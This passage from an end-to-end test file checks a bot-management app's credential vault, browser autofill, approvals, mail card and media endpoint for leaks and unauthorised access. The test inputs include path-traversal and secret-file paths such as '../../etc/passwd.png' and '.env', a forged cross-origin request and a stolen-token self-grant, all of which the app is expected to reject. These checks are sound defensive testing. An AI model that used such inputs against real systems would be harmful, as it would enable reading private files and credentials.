  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}glass-dark.png` })
  await page.getByRole('button', { name: 'Passer au thème clair' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')

  // Background turn of an already open bot: "Au travail" right away, then "Terminé".
  for (const client of wss.clients) send(client, event('chat-nova', 'message.start', { turn_id: 'turn-fond' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 3_000 })
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-fond', text: 'Travail de fond terminé.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })

  // Work summary: visible on the row of a background bot, with no unread before the turn ends.
  const novaBadge = page.locator('[data-bot=nova] .unread-badge')
  const unreadOf = async () => Number((await novaBadge.count()) ? await novaBadge.innerText() : 0)
  const unreadBeforeWork = await unreadOf()
  // Like the real gateway during this turn: otherwise the turn polling (6 s) reports it done before the summary (4 s).
  liveStatusByProfile.nova = 'working'
  for (const client of wss.clients) {
    send(client, event('chat-nova', 'message.start', { turn_id: 'turn-resume' }))
    send(client, event('chat-nova', 'todo.updated', { revision: 1, todos: [{ id: '1', content: 'Relire le plan', status: 'completed' }, { id: '2', content: 'Écrire le résumé', status: 'in_progress' }] }))
  }
  await page.locator('[data-bot=nova] .bot-row-work').getByText('2/2 · Écrire le résumé').waitFor({ timeout: 7_000 })
  if (await unreadOf() !== unreadBeforeWork) throw new Error('Un non-lu est apparu pendant le travail.')
  delete liveStatusByProfile.nova
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-resume', text: 'Résumé écrit.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  if (await unreadOf() !== unreadBeforeWork + 1) throw new Error('La fin du tour doit compter un seul non-lu.')

  // On the open bot: a step in the header and the panel, never a terminal command.
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-etape' }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'a', name: 'read_file', context: '/tmp/dossier/plan.md' }))
  }
  await page.locator('.work-card').getByText('Lit plan.md').waitFor({ timeout: 7_000 })
  await page.locator('.chat-status-detail').getByText('Lit plan.md').waitFor({ timeout: 2_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'tool.start', { tool_id: 'b', name: 'terminal', context: 'curl -H "Authorization: Bearer secret-test"' }))
  await page.locator('.work-card').getByText('Lance une commande').waitFor({ timeout: 7_000 })
  if (await page.getByText('secret-test').count()) throw new Error('La commande d’un terminal est affichée.')
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-etape', text: 'Étape terminée.', status: 'complete' }))
  await page.locator('.work-card').waitFor({ state: 'detached', timeout: 3_000 })

  // Vault and approvals: the gateway asks, the app answers with the same id, nothing secret remains.
  if (capabilityCalls === 0) throw new Error('client.capabilities n’a pas été annoncé.')
  const sheet = page.locator('.request-sheet')
  const ask = (id, method, params = {}) => { for (const client of wss.clients) send(client, { jsonrpc: '2.0', id, method, params: { session_id: 'chat-orion', ...params } }) }
  const answerOf = async (id) => {
    for (let attempt = 0; attempt < 40 && !clientResponses.has(id); attempt += 1) await delay(50)
    if (!clientResponses.has(id)) throw new Error(`Pas de réponse à ${id}.`)
    return clientResponses.get(id)
  }
  ask('srq-login', 'vault.save_login', { origin: 'https://exemple.test', site: 'exemple.test' })
  await sheet.getByText('https://exemple.test').waitFor({ timeout: 3_000 })
  await sheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await page.getByLabel('Identifiant du site').fill('moi@exemple.test')
  await page.getByLabel('Mot de passe du site').fill('mot-de-passe-test')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}vault-login.png` })
  await sheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const login = JSON.parse((await answerOf('srq-login')).result.value)
  if (login.identifier !== 'moi@exemple.test' || login.password !== 'mot-de-passe-test') throw new Error('Réponse du coffre incorrecte.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  if (await page.getByText('mot-de-passe-test').count()) throw new Error('Le mot de passe est resté affiché.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage }).includes('mot-de-passe-test'))) throw new Error('Le mot de passe a été stocké dans le navigateur.')
  ask('srq-code', 'vault.code', { site: 'exemple.test', hint: 'Code reçu par SMS' })
  await sheet.getByText('Code reçu par SMS').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Passer' }).click()
  if ((await answerOf('srq-code')).result.value !== '') throw new Error('Passer doit répondre une valeur vide.')
  ask('srq-unlock', 'vault.unlock_prompt', { backend: 'gestionnaire', display_name: 'Gestionnaire' })
  await sheet.getByText('Déverrouiller Gestionnaire').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'request.cancel', { id: 'srq-unlock', method: 'vault.unlock_prompt', reason: 'timeout' }))
  await sheet.waitFor({ state: 'detached', timeout: 3_000 })
  ask('srq-ok', 'approval', { request_id: 'r1', command: 'commande de test', description: 'Action à valider', choices: ['once', 'session', 'deny'] })
  await sheet.getByText('commande de test').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Autoriser une fois' }).click()
  if ((await answerOf('srq-ok')).result.choice !== 'once') throw new Error('Choix d’accord incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  ask('srq-non-gere', 'clarify', { question: 'Question ?' })
  if ((await answerOf('srq-non-gere')).error?.code !== -32601) throw new Error('Une demande non gérée doit être refusée tout de suite.')
  ask('srq-fenetre', 'terminal.read')
  if ((await answerOf('srq-fenetre')).error?.code !== 4404) throw new Error('Une demande de fenêtre doit répondre 4404.')
  // A request left open comes back when the session resumes.
  openRequests = [{ id: 'srq-reprise', method: 'vault.code', params: { session_id: 'chat-nova', site: 'reprise.test' } }]
  await page.locator('[data-bot=nova]').click()
  await sheet.getByText('Code de vérification pour reprise.test').waitFor({ timeout: 5_000 })
  openRequests = []
  await sheet.getByLabel('Code', { exact: true }).fill('123456')
  await sheet.getByRole('button', { name: 'Valider' }).click()
  if ((await answerOf('srq-reprise')).result.value !== '123456') throw new Error('Code de reprise incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })

  // CDP vault: bots API on 4333, local window on 4332, gateway never the recipient.
  const vaultCall = async (action) => {
    const response = await fetch(`http://127.0.0.1:4333/v1/${action}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'orion', target: 'onglet-steam' }),
      signal: AbortSignal.timeout(10_000),
    })
    const raw = await response.text()
    return { httpStatus: response.status, body: JSON.parse(raw), raw }
  }
  if ((await fetch('http://127.0.0.1:4332/api/browser-vault/events')).status !== 401) throw new Error('Les demandes du coffre sont lisibles sans session.')
  const missingTarget = await fetch('http://127.0.0.1:4333/v1/save', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'orion' }),
  })
  if (missingTarget.status !== 400 || (await missingTarget.json()).error !== 'target_required') throw new Error('Un appel sans targetId doit être refusé.')
  const savingBrowser = vaultCall('save')
  const browserSheet = page.locator('.browser-vault-dialog')
  await browserSheet.getByText('https://store.steampowered.com', { exact: true }).waitFor({ timeout: 3_000 })
  await browserSheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await browserSheet.getByLabel('Identifiant du site').fill('steam-test')
  await browserSheet.getByLabel('Mot de passe du site').fill(BROWSER_SECRET)
  await browserSheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const savedBrowser = await savingBrowser
  if (savedBrowser.httpStatus !== 200 || savedBrowser.body.status !== 'saved') throw new Error(`Enregistrement CDP refusé: ${savedBrowser.raw}`)
  if (savedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le secret CDP est renvoyé au bot après save.')
  await browserSheet.waitFor({ state: 'detached', timeout: 2_000 })
  const listedBrowser = await vaultCall('list')
  if (listedBrowser.body.entries?.[0]?.identifier !== 'steam-test' || listedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('list du coffre CDP incorrect.')
  // Stored in the keychain (disposable here), reserved for the bot that asked for it.
  const keychainDump = await execFileAsync('/usr/bin/security', ['dump-keychain', BROWSER_VAULT_KEYCHAIN])
  if (!keychainDump.stdout.includes('HermesBot') || !keychainDump.stdout.includes('"crtr"<uint32>="HBot"') || keychainDump.stdout.includes(BROWSER_SECRET)) throw new Error('Identifiant absent du trousseau.')
  const otherBot = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova', target: 'onglet-steam' }),
  })
  if (otherBot.status !== 403 || (await otherBot.json()).error !== 'bot_not_allowed') throw new Error('Un autre bot utilise un identifiant qui ne lui est pas réservé.')
  const otherList = await fetch('http://127.0.0.1:4333/v1/list', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova' }),
  })
  if ((await otherList.json()).entries?.length !== 0) throw new Error('Un bot voit les identifiants réservés à un autre.')
  // A bot cannot authorize itself through the app API: token required, file in 0600.
  const selfGrant = (headers) => fetch('http://127.0.0.1:4333/admin/v1/entries', {
    method: 'POST', headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify({ origin: 'https://store.steampowered.com', identifier: 'steam-test', bots: ['*'] }),
  })
  for (const headers of [{}, { Authorization: 'Bearer faux' }, { Authorization: `Bearer ${'0'.repeat(64)}` }]) {
    const refused = await selfGrant(headers)
    if (refused.status !== 403 || (await refused.json()).error !== 'admin_forbidden') throw new Error('API d’administration du coffre ouverte sans jeton.')
  }
  if ((await fetch('http://127.0.0.1:4333/admin/v1/entries')).status !== 403) throw new Error('Liste d’administration lisible sans jeton.')
  // Even with the token (readable by a bot of the same account), a write requires the user's Hermes session.
  const stolenToken = { Authorization: `Bearer ${readFileSync(BROWSER_VAULT_TOKEN, 'utf8').trim()}` }
  for (const headers of [stolenToken, { ...stolenToken, 'X-Hermes-Cookie': 'hermes_session=faux' }]) {
    const refused = await selfGrant(headers)
    if (refused.status !== 403 || (await refused.json()).error !== 'user_session_required') throw new Error('Écriture du coffre acceptée sans session Hermes.')
  }
  if ((await fetch('http://127.0.0.1:4333/admin/v1/entries', { headers: stolenToken })).status !== 200) throw new Error('Lecture des métadonnées refusée avec le jeton.')
  if (((await import('node:fs')).statSync(BROWSER_VAULT_TOKEN).mode & 0o777) !== 0o600) throw new Error('Jeton du coffre lisible par d’autres comptes.')
  const cliListed = await execFileAsync(process.execPath, ['scripts/browser-vault.mjs', 'list', '--bot', 'orion'], {
    cwd: new URL('..', import.meta.url), env: { ...process.env, HERMESBOT_VAULT_PORT: '4333' },
  })
  if (JSON.parse(cliListed.stdout).entries?.[0]?.identifier !== 'steam-test' || cliListed.stdout.includes(BROWSER_SECRET)) throw new Error('CLI du coffre CDP incorrect.')
  const cliFilled = await execFileAsync(process.execPath, ['scripts/browser-vault.mjs', 'fill', '--bot', 'orion', '--target', 'onglet-steam'], {
    cwd: new URL('..', import.meta.url), env: { ...process.env, HERMESBOT_VAULT_PORT: '4333' },
  })
  if (JSON.parse(cliFilled.stdout).status !== 'filled' || cdpInjections.at(-1).target !== 'onglet-steam') throw new Error('CLI fill ne respecte pas le targetId.')

  // Simulated reload: only the CDP arguments carry the secret, never the evaluated JavaScript.
  cdpUrl = 'https://store.steampowered.com/login/?reloaded=1'
  const filledBrowser = await vaultCall('fill')
  if (filledBrowser.httpStatus !== 200 || filledBrowser.body.fields?.join() !== 'identifier,password') throw new Error(`Remplissage CDP refusé: ${filledBrowser.raw}`)
  const loginInjection = cdpInjections.at(-1)
  if (loginInjection.target !== 'onglet-steam') throw new Error('Injection dans le premier onglet au lieu du targetId demandé.')
  if (loginInjection.values.join() !== `steam-test,${BROWSER_SECRET}`) throw new Error('Les champs CDP ne reçoivent pas les identifiants.')
  if (cdpExpressions.some((expression) => expression.includes(BROWSER_SECRET))) throw new Error('Secret interpolé dans Runtime.evaluate.')
  if (filledBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le secret CDP est renvoyé au bot après fill.')

  const injectionsBeforeRefusal = cdpInjections.length
  cdpUrl = 'https://example.com/login'
  const refusedBrowser = await vaultCall('fill')
  if (refusedBrowser.httpStatus !== 404 || refusedBrowser.body.error !== 'origin_not_found') throw new Error('Origine différente non refusée.')
  if (cdpInjections.length !== injectionsBeforeRefusal) throw new Error('Injection sur une origine différente.')
  const crossOrigin = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json', Origin: 'https://evil.example' }, body: JSON.stringify({ bot: 'orion' }),
  })
  if (crossOrigin.status !== 403) throw new Error('Une page web peut appeler le service des bots.')

  cdpUrl = 'https://store.steampowered.com/login/?code=1'
  const codingBrowser = vaultCall('code')
  await browserSheet.getByLabel('Code de vérification').fill(BROWSER_CODE)
  await browserSheet.getByRole('button', { name: 'Injecter le code' }).click()
  const codedBrowser = await codingBrowser
  if (codedBrowser.httpStatus !== 200 || codedBrowser.body.fields?.[0] !== 'code') throw new Error(`Code CDP refusé: ${codedBrowser.raw}`)
  if (cdpInjections.at(-1).target !== 'onglet-steam' || cdpInjections.at(-1).values[0] !== BROWSER_CODE || codedBrowser.raw.includes(BROWSER_CODE)) throw new Error('Circuit du code CDP incorrect.')

  const cancellingBrowser = vaultCall('save')
  await browserSheet.getByRole('button', { name: 'Plus tard' }).waitFor({ timeout: 3_000 })
  await browserSheet.getByRole('button', { name: 'Plus tard' }).click()
  if ((await cancellingBrowser).body.status !== 'cancelled') throw new Error('Annulation du coffre CDP incorrecte.')

  // Settings > Vault: the identifier shows without a password, Nova is authorized in addition to Orion.
  await page.keyboard.press('Meta+,')
  await page.locator('.settings-nav').getByRole('button', { name: 'Coffre' }).click()
  const vaultEntry = page.locator('.vault-entry').filter({ hasText: 'store.steampowered.com' })
  await vaultEntry.getByText('steam-test · Orion').waitFor({ timeout: 5_000 })
  if (await page.locator('.settings').getByText(BROWSER_SECRET).count()) throw new Error('Mot de passe visible dans les réglages.')
  await vaultEntry.getByRole('button', { name: 'Modifier' }).click()
  await page.locator('.vault-bot').filter({ hasText: 'Nova' }).locator('input').check()
  await page.locator('.vault-form').getByRole('button', { name: 'Enregistrer' }).click()
  await vaultEntry.getByText('steam-test · Nova, Orion').waitFor({ timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}vault-settings.png` })
  const allowedFill = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova', target: 'onglet-steam' }),
  })
  if (allowedFill.status !== 200 || cdpInjections.at(-1).values.join() !== `steam-test,${BROWSER_SECRET}`) throw new Error('Mot de passe perdu après le changement de bots.')
  // Direct add from the settings, then removal.
  await page.locator('.vault-tools').getByRole('button', { name: 'Ajouter un identifiant' }).click()
  await page.locator('.vault-form').getByLabel('Site').fill('https://exemple.com/connexion')
  await page.locator('.vault-form').getByLabel('Identifiant').fill('ajout-test')
  await page.locator('.vault-form').getByLabel('Mot de passe').fill('mot-de-passe-ajout')
  await page.locator('.vault-bot.is-all input').check()
  await page.locator('.vault-form').getByRole('button', { name: 'Enregistrer' }).click()
  const addedEntry = page.locator('.vault-entry').filter({ hasText: 'exemple.com' })
  await addedEntry.getByText('ajout-test · Tous les bots').waitFor({ timeout: 5_000 })
  page.once('dialog', (dialog) => dialog.accept())
  await addedEntry.getByRole('button', { name: 'Retirer' }).click()
  await addedEntry.waitFor({ state: 'detached', timeout: 5_000 })
  await page.getByRole('button', { name: 'Fermer les réglages' }).click()
  await page.locator('.settings-backdrop').waitFor({ state: 'detached', timeout: 3_000 })

  const browserAudit = readFileSync(BROWSER_VAULT_AUDIT, 'utf8')
  if (browserAudit.includes(BROWSER_SECRET) || browserAudit.includes(BROWSER_CODE)) throw new Error('Secret dans le journal du coffre.')
  if (serverLog.includes(BROWSER_SECRET) || serverLog.includes(BROWSER_CODE)) throw new Error('Secret dans les logs du serveur.')
  if (JSON.stringify([...clientResponses.values()]).includes(BROWSER_SECRET) || JSON.stringify([...clientResponses.values()]).includes(BROWSER_CODE)) throw new Error('Secret CDP passé par la gateway.')
  if (await page.getByText(BROWSER_SECRET).count() || await page.evaluate((secret) => JSON.stringify({ ...localStorage, ...sessionStorage }).includes(secret), BROWSER_SECRET)) throw new Error('Secret CDP conservé dans le navigateur.')

  // Mail card: edited by hand, what is sent to the bot carries what was approved and its digest.
  const askMail = async (id) => {
    await page.getByRole('textbox', { name: 'Message à Orion' }).fill(`Test mail ${id}`)
    await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  }
  await askMail('m1')
  await page.locator('.mail-note.is-muted').getByText('Brouillon de mail en cours').waitFor({ timeout: 3_000 })
  if (await page.locator('.messages-column').getByText('Draft-Id').count()) throw new Error('Le bloc de mail brut est visible.')
  const card = page.locator('.mail-card')
  await card.waitFor({ timeout: 5_000 })
  if (await page.locator('.messages-column').getByText('hermes-mail').count()) throw new Error('Le bloc de mail brut est visible.')
  await card.getByLabel('À', { exact: true }).fill('faux')
  if (await card.getByRole('button', { name: 'Envoyer' }).isEnabled()) throw new Error('Envoi possible avec une adresse invalide.')
  await card.getByLabel('À', { exact: true }).fill('autre@exemple.test')
  await card.getByLabel('Corps du mail').fill('Bonjour,\n\nTexte corrigé.')
  await delay(300)
  await card.scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}mail-card.png` })
  const promptsBeforeMail = promptCalls
  // An approved mail goes out even if the composer is in PLAN: the "send nothing" instruction must not follow it.
  await page.getByRole('radio', { name: 'PLAN', exact: true }).click()
  await card.getByRole('button', { name: 'Envoyer' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeMail; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeMail + 1) throw new Error('Un clic sur Envoyer doit lancer un seul tour.')
  if (lastApiText !== undefined) throw new Error('Un mail validé ne doit pas porter la consigne du mode.')
  await page.getByRole('radio', { name: 'EXEC', exact: true }).click()
  const digest = createHash('sha256').update('Bot <bot@exemple.test>\n77\nautre@exemple.test\n\nRe: Votre demande\nBonjour,\n\nTexte corrigé.').digest('hex')
  for (const expected of ['````hermes-mail-approved', 'Id: m1', 'Draft-Id: 77', 'To: autre@exemple.test', 'Texte corrigé.', `Approved-Digest: ${digest}`]) {
    if (!lastPromptText.includes(expected)) throw new Error(`Mail approuvé sans « ${expected} ».`)
  }
  await card.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.message-assistant .mail-note').getByText('Mail approuvé : Re: Votre demande').waitFor({ timeout: 2_000 })
  await page.locator('.message-user .mail-note').getByText('Re: Votre demande, à autre@exemple.test').waitFor({ timeout: 2_000 })
  await delay(500) // the simulated turn ends: the next send would be ignored while it runs
  // Ignore: no turn started, choice kept after the thread reloads.
  await askMail('m2')
  await card.waitFor({ timeout: 5_000 })
  const promptsBeforeDiscard = promptCalls
  await card.getByRole('button', { name: 'Ignorer' }).click()
  await page.locator('.mail-note.is-muted').getByText('Brouillon écarté').waitFor({ timeout: 2_000 })
  if (promptCalls !== promptsBeforeDiscard) throw new Error('Ignorer ne doit lancer aucun tour.')
  if (await page.locator('[data-bot=orion] .bot-row-preview').getByText('hermes-mail').count()) throw new Error('Le roster montre le bloc brut.')

  // A video started during streaming keeps playing when the message ends: same element, same playback.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test média en direct')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.message.is-streaming video.media-video').waitFor({ timeout: 5_000 })
  await page.locator('.message.is-streaming video.media-video').evaluate(async (video) => {
    video.dataset.e2eMarker = 'pendant'
    video.muted = true
    video.loop = true
    await video.play()
  })
  await page.locator('.message-assistant:not(.is-streaming)').getByText('Et la suite du texte.').waitFor({ timeout: 6_000 })
  const liveVideo = await page.locator('.message-assistant:not(.is-streaming) video.media-video').last().evaluate((video) => ({ marker: video.dataset.e2eMarker, paused: video.paused }))
  if (liveVideo.marker !== 'pendant') throw new Error('La vidéo a été recréée à la fin du streaming.')
  if (liveVideo.paused) throw new Error('La vidéo s’est arrêtée à la fin du streaming.')

  // A NOREPLY typed letter by letter never appears in the thread, even during streaming.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test silence')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  for (let probe = 0; probe < 20; probe += 1) {
    if (await page.locator('.messages-column').evaluate((column) => /NOREPLY|NO(?!n)\b/.test(column.innerText.split('Test silence').pop() || ''))) {
      throw new Error('Un NOREPLY en streaming est visible.')
    }
    await delay(60)
  }
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })

  // /api/media over HTTP: session required, extensions and paths filtered, exact Range, strict headers.
  const sessionCookie = (await page.context().cookies('http://127.0.0.1:4332')).map((cookie) => `${cookie.name}=${cookie.value}`).join('; ')
  const media = (query, headers = {}) => fetch(`http://127.0.0.1:4332/api/media?${new URLSearchParams(query)}`, { headers: { Cookie: sessionCookie, ...headers } })
  if ((await fetch('http://127.0.0.1:4332/api/media?profile=orion&path=%2FUsers%2Ftest%2Fvideos%2Fvideo.mp4')).status !== 401) throw new Error('/api/media répond sans session.')
  for (const [query, status] of [
    [{ profile: 'orion', path: '/Users/test/.env' }, 415],
    [{ profile: 'orion', path: '/Users/test/auth.json' }, 415],
    [{ profile: 'orion', path: '/Users/test/logo.svg' }, 415],
    [{ profile: 'orion', path: '/Users/test/../../etc/passwd.png' }, 400],
    [{ profile: 'orion', path: 'relatif/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels.png/' }, 400],
    [{ profile: 'orion', path: '//hote/partage/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/./test/slide.png' }, 400],
    [{ profile: '../orion', path: '/Users/test/videos/video.mp4' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels/absent.jpg' }, 404],
  ]) {
    const result = await media(query)
    await result.arrayBuffer()
    if (result.status !== status) throw new Error(`/api/media ${JSON.stringify(query)} : HTTP ${result.status} au lieu de ${status}`)
  }
  const partial = await media({ profile: 'orion', path: '/Users/test/videos/video.mp4' }, { Range: 'bytes=0-99' })
  const partialBytes = (await partial.arrayBuffer()).byteLength
  if (partial.status !== 206 || partial.headers.get('content-range') !== `bytes 0-99/${VIDEO_SIZE}` || partialBytes !== 100) {
    throw new Error(`Range vidéo mal relayé : ${partial.status} ${partial.headers.get('content-range')} ${partialBytes} octets`)
  }
  const image = await media({ profile: 'orion', path: '/Users/test/visuels/slide-02.png' })
  await image.arrayBuffer()
  if (image.status !== 200 || image.headers.get('content-type') !== 'image/png'
    || /attachment/i.test(image.headers.get('content-disposition') || '')
    || !/sandbox/.test(image.headers.get('content-security-policy') || '')
    || image.headers.get('x-content-type-options') !== 'nosniff') throw new Error('En-têtes de l’image relayée incorrects.')
  await page.getByRole('tab', { name: /Activité/ }).click()
  // History and "Test silence": two silences, both filed under Activité.
  await page.locator('.activity-row').getByText('NOREPLY').first().waitFor()
  await page.locator('.activity-row').getByText('Background process').first().waitFor()
  await page.locator('.activity-row').getByText('Délégation terminée').first().waitFor()
  if (await page.locator('.activity-row').getByText('demande entre bots').count()) throw new Error('Un message entre bots est resté dans Activité.')
  await page.getByRole('tab', { name: /Routines/ }).click()

  // Messages between bots: "Nova messaged Orion", "Orion messaged Nova", "Nova replied to Orion".
  const notes = page.locator('.messages-scroll .agent-note')
  await notes.first().waitFor({ timeout: 5_000 })
  const noteLines = await notes.locator('.agent-note-line').evaluateAll((lines) => lines.map((line) => [...line.children].filter((child) => child.tagName !== 'TIME').map((child) => child.textContent.trim()).join(' ')))
  for (const expected of ['Nova messaged Orion', 'Orion messaged Nova', 'Nova replied to Orion']) {
    if (!noteLines.includes(expected)) throw new Error(`Ligne « ${expected} » absente : ${JSON.stringify(noteLines)}`)
  }
  if (await page.locator('.messages-scroll').getByText('Peux-tu relire').count()) throw new Error('Le message entre bots doit rester fermé.')
  const sentNote = notes.filter({ hasText: 'Orion messaged Nova' })
  await sentNote.getByRole('button', { name: 'messaged' }).click()
  await sentNote.locator('.agent-note-body strong').getByText('plan').waitFor()
  await sentNote.locator('.agent-note-body').getByText('Reply needed: Un OK écrit').waitFor()
  await notes.filter({ hasText: 'Nova replied to Orion' }).getByRole('button', { name: 'replied to' }).click()
  await page.locator('.agent-note-body').getByText('Plan relu, OK écrit.').waitFor()
  await page.locator('.agent-note-body .cited-files img.media-image').waitFor({ timeout: 5_000 })
  // An upward gesture detaches the thread from the bottom, like a user scrolling up.
  await page.locator('.messages-scroll').hover()
  await page.mouse.wheel(0, -200)
  await notes.first().evaluate((element) => element.scrollIntoView({ block: 'start' }))
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}agent-messages.png` })
  await sentNote.getByRole('button', { name: 'messaged' }).click()
  await sentNote.locator('.agent-note-body').waitFor({ state: 'detached' })
  // Live: a `message_agent` call, then a turn started by another bot's message.
  const notesBefore = await notes.count()
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'tool.start', { tool_id: 'tool-live-dm', name: 'message_agent', args: { target: 'nova', message: 'Envoi en direct' } }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'tool-live-dm', name: 'message_agent', args: { target: 'nova', message: 'Envoi en direct' } }))
    send(client, event('chat-orion', 'tool.complete', { tool_id: 'tool-live-dm', name: 'message_agent' }))
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-dm', display_kind: 'internal_notification', text: 'Message from 🤖 Nova (@nova): Réveil en direct' }))
    send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-dm', text: 'Bien reçu, Nova.', status: 'complete' }))
  }
  await page.locator('.message-assistant').getByText('Bien reçu, Nova.').waitFor({ timeout: 5_000 })
  if (await notes.count() !== notesBefore + 2) throw new Error(`Messages entre bots en direct : ${await notes.count() - notesBefore} au lieu de 2`)
  await notes.last().getByRole('button', { name: 'messaged' }).click()
  await notes.last().locator('.agent-note-body').getByText('Réveil en direct').waitFor()
  await notes.filter({ hasText: 'Orion messaged Nova' }).locator('.agent-note-name').filter({ hasText: 'Nova' }).last().click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  await page.locator('.message-assistant').getByText('Bien reçu, Nova.').waitFor()
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test de streaming')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  try {
    // The simulated gateway gives every turn the same id, so this reply normally reuses the bubble of an earlier
    // turn of this chat. When the background refresh of the chat ran first, that bubble has another id and the
    // reply gets a bubble of its own: one or two matches are both right.
    await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').last().waitFor({ timeout: 10_000 })
    await page.locator('[data-bot=orion] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  } catch (error) {
    console.log('chat au moment de l’échec:', await page.locator('.messages-column').innerText())
    console.log('notice:', await page.locator('.toast').allTextContents())
    throw error
  }
  await page.locator('.routine-row').waitFor({ timeout: 5_000 })
  const routines = await page.locator('.routine-row').count()
  if (routines !== 1) throw new Error(`Routines: ${routines} au lieu de 1`)

  const rosterCallsBeforeSwitch = profilesListCalls
  await page.locator('[data-bot=nova]').click()
  await page.locator('.message-assistant').getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').first().waitFor()
  if (profilesListCalls !== rosterCallsBeforeSwitch) throw new Error('Cache: un changement de bot a relu le roster.')

  if (await page.locator('.usage-readout').count()) throw new Error('Contexte et tok/s doivent être masqués par défaut.')
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()
  await page.locator('.usage-readout').getByText('Contexte 4 % (41k/1M) · 63 tok/s').waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()

  const promptsBeforeCommand = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('/model sonnet')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  if (promptCalls !== promptsBeforeCommand) throw new Error('/model a été envoyé au bot.')
  if (await page.locator('.model-option[data-model="claude-opus-5-5"]').count()) throw new Error('/model sonnet ne filtre pas.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  if (await page.locator('.model-option[data-model="modele-interdit"]').count()) throw new Error('Fournisseur non connecté proposé.')
  if (await page.locator('.model-option[data-model="hidden-model"]').count()) throw new Error('Un fournisseur masqué par les réglages doit être retiré du sélecteur.')
  page.once('dialog', (dialog) => dialog.accept())
  // The active model's group is open, the others are collapsed; collapsing persists between launches.
  const kimiGroup = page.locator('.model-group', { hasText: 'Kimi' })
  const anthropicGroup = page.locator('.model-group', { hasText: 'Anthropic' })
  if (!await anthropicGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Le groupe du modèle actif doit être ouvert.')
  if (await kimiGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Les autres fournisseurs doivent être pliés.')
  // The real logos pass the app's CSP; all local servers form a single group with no brand logo.
  await page.waitForFunction(() => {
